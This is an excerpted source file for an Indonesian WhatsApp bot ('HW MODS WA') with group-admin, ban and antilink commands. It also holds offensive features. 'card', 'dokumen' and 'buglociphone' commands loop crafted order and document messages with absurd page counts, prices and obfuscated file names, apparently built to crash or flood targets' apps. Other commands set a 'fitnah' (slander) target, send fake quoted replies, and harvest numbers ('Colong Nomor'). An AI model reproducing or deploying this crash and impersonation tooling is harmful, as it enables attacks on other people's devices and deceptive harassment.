...
const { kalganteng } = require('./lib/kalganteng.js')
// Database ( Haikal )
...
targetpc = '6282316214501' // Fitnah Target ( HAIKAL )
owner = '6282316214501' // Numbers Owner ( HW MODS WA )
ownerNumbers = ["6282316214501@s.whatsapp.net","6282316214501@s.whatsapp.net","6282316214501@s.whatsapp.net"]
...
fake = ' ꪶꪶ ༑ 𝐸𝑋̅𝑇͢𝐸𝑅̅𝑁͢𝐴𝐿 ༑ ꫂꫂ' // Fake Text Reply / Name Bot (   ␥ ᑅ⏤ ͟͞𝐸𝑋̅𝑇͢𝐸𝑅̅𝑁͢𝐴𝐿 ͟͞⏤ᑅ ␥ )
...
const mess = {
   ...
   "error": {
      ...
      "only": {
       "group": "```⊷️「 ⺙ Group Only ム 」```",
       "pribadi": "```⊷️「 ⺙ Private Only ム 」```"
   },
   "ban": "```⊷️「 区 You Are Banned 区 」```"
}
		const isUrl = (url) => {
...
"productMessage": {
						"product": {
							...
							"title": "𝑯𝑾 𝑴??𝑫𝑺 𝑾𝑨 🔥",
							"description": `©[𝑿𝑴]-𝑿𝑯𝑰𝑹𝑶 𝑴𝑯𝑶𝑵𝑺𝑯𝑵𝑬さ${ngazap(prefix)}`,
							"currencyCode": "IDR",
							"itemCount": oi2,
							                    "message": oi1,
						...
						"businessOwnerJid": "6282316214501@s.whatsapp.net",
"contextInfo": {
           "forwardingScore": 999,
           "isForwarded": true
            }
...
//=================================================//        
	    ...
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "34699303450-1355008702@g.us" } : {}) 
                        ...
                        "message": {
		"extendedTextMessage": {
			"text": "*©[𝑿𝑴]-𝑿𝑯𝑰𝑹𝑶 𝑴𝑯𝑶𝑵𝑺𝑯𝑵𝑬⽀*",
			"previewType": "NONE",
			"contextInfo": {
				"stanzaId": "3EB0382EDBB2",
				"participant": "6282316214501@s.whatsapp.net"
					}}}}	        
//=================================================//		
...
const loli = fs.readFileSync('media/loli.mp3')
                    ...
                    if (isBan) return reply(mess.ban)
const bot = fs.readFileSync('media/mastah.mp3')
                    Haikal.sendMessage(from, bot, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
...
const checkWin = (sender) => {
	...
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		...
		Haikal.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: kal, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./temp/" + from + ".json");
	}
}
//========================================================================================================================//
...
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "`⿻𝑬𝑿𝑻𝑬𝑹𝑵𝜟𝑳⃪→ꪶ𖦂ꫂ",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Ak-he0Jdrxqi9WdQEaUhsr6v9M58mHuCPLQjo6xmbH1i.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "uqfotsPkTIkFB2OzaSpFrfSF/kAp2HVMArR8p3wQq3Y=",
						"fileLength": "281170",
						"height": 808,
						"width": 720,
						"mediaKey": "7sp6CkJG9U+9GqH4eY5ViE4zYw+knPpTrvF1ryZjwMM=",
						"fileEncSha256": "yJnpoFOxJUUJf62GRPP32vcva5wtRzpodlvc4YYqSSE=",
						"directPath": "/v/t62.7118-24/30910822_427086368788651_6924832966618064646_n.enc?ccb=11-4&oh=b2e102797f617db7ff24cad11b70ec93&oe=6194EEB1",
						"mediaKeyTimestamp": "1634682544"
					 },
						"contentText": `⎘⏤ ͟͞𝜢𝑾 𝑴𝜣𝑫𝑺 𝑾𝜟 ͟͞⏤⎗
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
Prefix : 「 MULTI-PREFIX 」
SELAMAT DATANG
...
JANGAN LUPA SUBSCRIBE`,
						...
						"buttons": [
							{
								"buttonId": "め𝑯𝑾 𝑴𝑶𝑫𝑺 𝑾𝑨⺐",
								"buttonText": {
									"displayText": ` 么𝑫𝑶𝑵𝑨𝑺𝑰 𝑩𝑶𝑻么
⎘⏤ ͟͞𝜢𝑾 𝑴𝜣𝑫𝑺 𝑾𝜟 ͟͞⏤⎗
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW 
- DONASI -
...
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AuRA9iwRMaXQUayzS5L_anSOyRxt3KLOCfKCuEHmqOv5.enc",
						"mimetype": "image/jpeg",
						"fileSha256":  "6Q1GC3BLF5fAh7wGdOPCgp/MgIp4kUE3biReqUozjrE=",
						"fileLength": "96994",
						"height": 1041,
						"width": 931,
						"mediaKey": "bgia+HhnvTCcEG17lOsFNE96bQJh64y5pqCcJSxTTfE=",
						"fileEncSha256": "YECo7z/PoTiDgu0iy20M8lfBzWro9iQJw0OY8EfClq0=",
						"directPath": "/v/t62.7118-24/40801516_616380746083570_1476139264427457355_n.enc?ccb=11-4&oh=f78a73ad853baa0992d196659d6a01b9&oe=61CA96AE",
						"mediaKeyTimestamp": "1638122207"
					 },
...
JANGAN LUPA SUBSCRIBE`,
						...
						"buttons": [
							{
								"buttonId": "め??𝑾 𝑴𝑶𝑫𝑺 𝑾𝑨⺐",
								"buttonText": {
									"displayText": ` ⺐𝑻𝑯𝑨𝑵𝑲 𝒀𝑶𝑼⺐
⎘⏤ ͟͞𝜢𝑾 𝑴𝜣𝑫𝑺 𝑾𝜟 ͟͞⏤⎗
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT XM 
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
...
┣ ♻️➩${prefix}leave <id>
┣ ♻️➩${prefix}self [Self]
┣ ♻️➩${prefix}public [Public]
┣ ♻️➩${prefix}off <query>
┣ ♻️➩${prefix}intro [intro]
┣ ♻️➩${prefix}on [Online]
┣ ♻️➩${prefix}ban <target>
┣ ♻️➩${prefix}status [Status]
┣ ♻️➩${prefix}antibug <on/off>
┣ ♻️➩${prefix}antitag <on/off>
┣ ♻️➩${prefix}autoread <query>
┣ ♻️➩${prefix}anticall <on/off>
┣ ♻️➩${prefix}antidelete <on/off>
┣ ♻️➩${prefix}join <link>
┣ ♻️➩${prefix}restart [Restart]
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
...
res = await Haikal.prepareMessageFromContent(from,{
						...
						"text": "",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ArH61jZ8lDacPj43lwEHoICMhKBAVScCGUjHJbEedfZC.enc",
						"mimetype": "image/jpeg",
						"fileSha256":  "qwDbC5KKMxiSn4HYxAEbl1r7rhpYdsv00Al9vodeOyY==",
						"fileLength": "47173",
						"height": 554,
						"width": 554,
						"mediaKey": "6/qsEOAghyk0whw+5KBndBcV86FMFojjht03q+gbKLs=",
						"fileEncSha256": "RAUHonlSVEBBF8Svf8wZbsuKfltNPfNSTCYIpOVLtsg=",
						"directPath": "/v/t62.7118-24/33479104_4477153069073652_8987288908558322383_n.enc?ccb=11-4&oh=01_AVzNPQ7dkyB467NKWcqizKpaYMTjPWzINVUMggMpZFoJmg&oe=61F71FAD",
						"mediaKeyTimestamp": "1641159642"
					 },
						"contentText": `Hai ${pushname}
Prefix : 「 MULTI-PREFIX 」
┏━━⊱
...
sendMediaURL(from, `${res.url}`, 'NIH KAK!')
})
...
antidel = true
freply(` ⊷️「Success 」mengaktifkan antidelete`)
} else if (args[0] === "off") {
if (antidel === false) return
antidel = false
freply(` ⊷️「Success 」mematikan antidelete`)
} else {
...
antical = true
freply(`⊷️「Success 」  mengaktifkan anticall`)
} else if (args[0] === "off") {
if (antical === false) return
antical = false
freply(` ⊷️「Success 」mematikan anticall`)
} else {
freply(`Pilih on atau off`)
}
break
...
readG = true
freply(` ⊷️「Success 」mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readG === false) return
readG = false
freply(` ⊷️「Success 」mematikan autoread group`)
} else {
freply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
...
readP = true
freply(` ⊷️「Success 」mengaktifkan autoread pribadi`)
} else if (args[1] === "off") {
if (readP === false) return
readP = false
freply(` ⊷️「Success 」mematikan autoread pribadi`)
} else {
freply(`Pilih on atau off`)
}
} else {
...
break                  
    ...
    if (isBan) return reply(mess.ban)
          ...
          bugc = true
          antitrol = true
          freply('⊷️「Success 」menyalakan antibug')
          } else if (args[0] === 'off') {
          if (bugc === false) return
          bugc = false
          antitrol = false
          freply('⊷️「Success 」mematikan antibug')
          } else {
          freply('Pilih on atau off')
          }
          break
...
Haikal.sendMessage(from, ' ⊷️「め Success め」change description group', text, {quoted:kal})
break
...
Haikal.sendMessage(from, ' ⊷️「め Success め」change name group', text, {quoted:kal})
break
...
Haikal.sendMessage(from, buffergbl, image, {quoted: kal, caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`})
break
...
teks = `Members @${mentionede.split('@')[0]}  ⊷️「め Success め」demote`
...
teks = `Members @${mentionede.split('@')[0]}  ⊷️「め Success め」promote`
Haikal.sendMessage(from, teks, text, {quoted:kal, contextInfo:{mentionedJid:[mentionede]}})
break
...
freply('``` ⊷️「め Success め」revoke link group```')
break
...
Haikal.sendMessage(from, `User @${orgnye.split("@")[0]}, berhasil dibanned`, text, {quoted:kal, contextInfo:{mentionedJid:[orgnye]}})
Haikal.sendMessage(`6285714170944@s.whatsapp.net`, `\`\`\`「 Banned 」\`\`\`\n•> Nomer : @${orgnye.split("@")[0]}\n•> Command : Banned`, text, {quoted:kal, contextInfo:{mentionedJid:[orgnye]}})
} else if (args[0] === "del") {
if (!isBane) return reply('User tidak dibanned')
let delbans = banUser.indexOf(orgnye)
banUser.splice(delbans, 1)
fs.writeFileSync('./database/banned.json', JSON.stringify(banUser))
Haikal.sendMessage(from, `User @${orgnye.split("@")[0]}, berhasil diunban`, text, {quoted:kal, contextInfo:{mentionedJid:[orgnye]}})
Haikal.sendMessage(`6285714170944@s.whatsapp.net`, `\`\`\`「 Banned 」\`\`\`\n•> Nomer : @${orgnye.split("@")[0]}\n•> Command : Unbanned`, text, {quoted:kal, contextInfo:{mentionedJid:[orgnye]}})
} else {
...
multi = true
freply(`\`\`\` ⊷️「Success」change prefix =「 Multi Prefix 」\`\`\``)
} else {
multi = false
pref = args[0]
freply(`\`\`\` ⊷️「Success」change prefix =「 ${args[0]} 」\`\`\``)
}
break
// Colong Nomor Yok
case 'nowa':
...
if (args[0] === "com") {
linknye = `${linkcom}`
freply(' *「 Success 」* ⊷️ め change antilink com')
} else if (args[0] === "id") {
linknye = `${linkid}`
freply(' *「 Success 」* ⊷️ め change antilink id')
} else if (args[0] === "xyz") {
linknye = `${linkxyz}`
freply(' *「 Success 」* ⊷️ め change antilink xyz')
} else if (args[0] === "http") {
linknye = `${linkhttp}`
freply(' *「 Success 」* ⊷️ め change antilink http')
} else if (args[0] === "ly") {
linknye = `${linkly}`
freply(' *「 Success 」* ⊷️ め change antilink ly')
} else if (args[0] === "wa") {
linknye = `${linkwa}`
freply(' *「 Success 」* ⊷️ め change antilink wa')
} else if (args[0] === "default") {
linknye = `${deflt}`
freply(' *「 Success 」* ⊷️ め change antilink default')
} else {
...
freply(' ⊷️「 Success 」menyalakan antilink di group ini')
...
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
freply(' ⊷️「 Success 」mematikan antilink di group ini')
} else {
...
break
    ...
    case 'settarget':
            ...
            targetpc = args[0]
            fakegroup(` ⊷️「Success」Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'slanderpm':
...
case 'tagall3':
					...
					Haikal.sendMessage(from, teks, text, {detectLinks: false, quoted: kal})
					break
    case 'tagall':
            if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
            if (!isGroup) return freply(mess.only.group)
	...
	case 'setfake':
			...
			fake = q
			freply(` ⊷️「Success」Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
                if (!kal.key.fromMe && !isOwner) return
        	if ((isMedia && !kal.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
...
res = await Haikal.prepareMessageFromContent(from,{
				"buttonsMessage": {
						"text": "",
						"contentText": "𝑯𝑾 𝑴𝑶𝑫𝑺 𝑾𝑨",
						"footerText": `HW MODS`,
						"buttons": [
							{
								"buttonId": "𝑿𝑯𝑰𝑹𝑶 𝑴𝑯𝑶𝑵𝑺𝑯𝑵𝑬さ ",
								"buttonText": {
						           "displayText": "⧉𝜲𝜢𝜤𝑹𝜣 𝜧𝜢𝜣𝜨𝑺𝜢𝜤𝜨𝜩⧉"
								},
								"type": "RESPONSE"
							}
						],
...
if (!isBan) 
  res = await Haikal.prepareMessageFromContent(from, {
                    "videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AtUzebBU7iGIwVj1pSxYZW65xsh2cZGzP3WCxen9OcvJ.enc",
						"mimetype": "video/mp4",
						"fileSha256": "Hohn8JqMAIttvk0pOewIq1g9722Ssxw7vE3/qsb8TWs=",
						"fileLength": "484571",
						"seconds": 4,
						"mediaKey": "AcZhPF6t48dqqPGQoxvS1ubOOm6QWbfmzW+qtk5se74=",
						"gifPlayback": true,
						"height": 640,
						"width": 640,
						"fileEncSha256": "z6eIA07hU/gJuuL7KnmVD/CBKPbJlSSSdbEVn4loMNM=",
						"directPath": "/v/t62.9505-24/19974019_274876331233337_8643428412742083141_n.enc?ccb=11-4&oh=588f7cb04caa77d1e8f789e7dc717b18&oe=61B29C58",
						"mediaKeyTimestamp": "1636731611",
						"jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"gifAttribution": "NONE"
					}
 ...
 break
case 'card':  
   if (!kal.key.fromMe) return reply(from, `Penggunaan ${prefix}card teks|jumlah`, kal)
    if (isBan) return reply(from, `Penggunaan ${prefix}card teks|jumlah`, kal)
        for (let i = 0; i < argz[1]; i++){
           res = await Haikal.prepareMessageFromContent(from, {
               "orderMessage": {
                  ...
                  "surface": "CATALOG",
                  "message": "",
                  "orderTitle": "ᔐ ꪶꪶ ⃯⃗𔕔҉🇮🇩༑ᴱˣᵀᴱᴿᴺᴬᴸ༑🇮🇩҉𔕔⃯⃗ ꫂꫂ ᔐ",
                  "thumbnail": fs.readFileSync("./media/deden.jpeg"),
                  "token": "AR4QUhFw+h1LZ12vhHfwuTERPsafiuswmzZ57NXy2XGo8Q=="
              },
              "contextInfo": {
...
if (!q) return reply(`Example: ${prefix}buglociphone namalu`)
 ...
 if (isBan) return reply(mess.ban)
        res = await Haikal.prepareMessageFromContent(from, {
        			"buttonsMessage": {
        				"documentMessage": {
        					"url": "https://mmg.whatsapp.net/d/f/ApYBcNXwSz6Z-8ASKp5yhowNG-IfC6k9evJKrX5f3fFx.enc",
						"mimetype": "application/pdf",
						"fileSha256": "nw2/HYvSSJRd5IC7d3cE5fGCrWqbi9qOdvbHpwmQpnQ=",
						"fileLength": "60968",
						"pageCount": 9999,
						"mediaKey": "nw2mRHoXCP5yZBlSWAITtsM4bLDgEA0IxcNo+Jnwyl8=",
						"fileName": `⼽⿻𝑬𝑿𝑻𝑬𝑹𝑵𝜟𝑳⃪→ꪶ𖦂ꫂ ${ngazap()}.pdf`, 
						"fileEncSha256": "gUoVuzGnT2WJM8gM9Bkh2CeKDkwrBUkaSp9mFx6xFMs=",
						"directPath": "/v/t62.7119-24/23424262_191546786452366_5776249165842234486_n.enc?ccb=11-4&oh=08ce043a6bdabd1d283b456e951b8f89&oe=618BFC5B",
						"mediaKeyTimestamp": "163408056"
        				},
        				"contentText": "⼽⿻𝑬𝑿𝑻𝑬𝑹𝑵𝜟𝑳⃪→ꪶ𖦂ꫂ",
        				"footerText": "々𝑺𝜢𝜤𝜨𝑪𝜢𝜟𝜨༗ ﾒ ⼽⿻𝑬𝑿𝑻𝑬𝑹𝑵𝜟𝑳⃪→ꪶ𖦂ꫂ",
        				"buttons": [
        				{
        					"buttonId": "chan",
        					"buttonText": {
        						"displayText": "⧉⼽`𝑬𝑿𝑻𝑬𝑹𝑵𝜟𝑳⃪→ꪶ𖦂ꫂ⧉"
        					},
        					"type": 1
        				},
        				{
        		...
        		break
        case 'dokumen':
if (!isOwner && !kal.key.fromMe) return sticOwner(from)
for (let i = 0; i < (q) ; i++){
        		res = await Haikal.prepareMessageFromContent(from, {
        			"buttonsMessage": {
        				"documentMessage": {
						...
						"fileName": `𖦃𔕔͢𝑬𝑿͢𝑻𝑬͢𝑹𝑵͢𝑨𝑳𔕔𖣘${vapi()}`,
...
"orderMessage": {
						...
						"message": "",
						"orderTitle": "サイコパス 𔕔",
						"sellerJid": "6282284348289@s.whatsapp.net",
						"token": "AR4QUhFw+h1LZ12vhHfwuTERPsafiuswmzZ57NXy2XGo8Q==",
						"totalAmount1000": "999999999999000",
